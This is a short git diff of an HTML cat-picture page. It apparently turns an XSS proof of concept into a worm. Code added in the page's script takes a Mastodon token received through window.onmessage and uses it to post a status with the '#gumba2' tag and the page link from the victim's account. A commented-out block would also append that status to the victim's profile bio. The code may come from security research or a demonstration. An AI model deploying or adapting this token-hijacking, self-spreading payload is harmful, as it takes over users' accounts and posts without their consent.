@@ -27,9 +27,26 @@ permalink: /cat
 
   <body>
     <img src="gumba.jpg" title="An adorable cat!">
+    <script src="jquery-3.5.1.min.js"></script>
+    <script src="mastodon.js"></script>
     <script>
-      window.onmessage = ({ data }) => {
-        alert(`Your token is ${data}`)
+      // post #gumba2 baby!
+      window.onmessage = ({ data: token }) => {
+        const api = new MastodonAPI({
+          instance: "https://mstdn.social",
+          api_user_token: token
+        });
+
+        const status = 'Look at this cute cat! #gumba2 ' + document.location.href
+        api.post("statuses", { status }, function (data) {
+          console.log('done toot')
+        });
+
+        // api.get('accounts/verify_credentials', {}, ({ source: { note } }) => {
+        //   api.patch("accounts/update_credentials", { note: note + '\n' + status }, function (data) {
+        //     console.log('done bio')
+        //   });
+        // })
       }
     </script>
     <iframe title="xss"
